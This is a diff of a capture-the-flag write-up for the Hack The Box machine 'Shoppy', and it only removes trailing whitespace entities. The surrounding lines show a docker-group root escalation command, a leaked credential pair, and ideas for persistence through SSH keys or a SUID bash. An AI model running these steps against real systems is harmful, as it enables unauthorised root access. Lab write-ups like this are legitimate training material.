@@ -16,7 +16,7 @@ PORT     STATE SERVICE
 9093/tcp open  copycat
 ```
 
-We have to add `shoppy.htb` to our `/etc/hosts` file.&#x20;
+We have to add `shoppy.htb` to our `/etc/hosts` file.
 
 ### HTTP
 
@@ -50,7 +50,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /js                   (Status: 301) [Size: 171] [--> /js/]
 ```
 
-There's a login page.&#x20;
+There's a login page.
 
 <figure><img src="../../../.gitbook/assets/image (2180).png" alt=""><figcaption></figcaption></figure>
 
@@ -79,7 +79,7 @@ The sub-domain brought me to another login page.
 
 <figure><img src="../../../.gitbook/assets/image (2272).png" alt=""><figcaption></figcaption></figure>
 
-Directory scanning and searching for public exploits returned nothing useful, so let's come back to this later.&#x20;
+Directory scanning and searching for public exploits returned nothing useful, so let's come back to this later.
 
 ### NoSQL Injection
 
@@ -163,7 +163,7 @@ username: deploy
 password: Deploying@pp!
 ```
 
-We can then `su` to `deploy`.&#x20;
+We can then `su` to `deploy`.
 
 ### Docker Group
 
@@ -174,7 +174,7 @@ deploy@shoppy:/tmp$ id
 uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
 ```
 
-We can use this to create a new container that has access to the filesystem of the machine, and make ourselves `root` of the container. This effectively gives us `root` access over the files of the main machine too.&#x20;
+We can use this to create a new container that has access to the filesystem of the machine, and make ourselves `root` of the container. This effectively gives us `root` access over the files of the main machine too.
 
 ```
 deploy@shoppy:/tmp$ docker images
@@ -185,6 +185,6 @@ deploy@shoppy:/tmp$ docker run --rm -it -v /:/mnt alpine /bin/sh
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 ```
 
-With this, we can go to `/mnt/root/root.txt` to read the root flag. We can also drop our public SSH key into the `authorized_keys` file or make `/bin/bash` an SUID binary.&#x20;
+With this, we can go to `/mnt/root/root.txt` to read the root flag. We can also drop our public SSH key into the `authorized_keys` file or make `/bin/bash` an SUID binary.
 
 <figure><img src="../../../.gitbook/assets/image (4065).png" alt=""><figcaption></figcaption></figure>
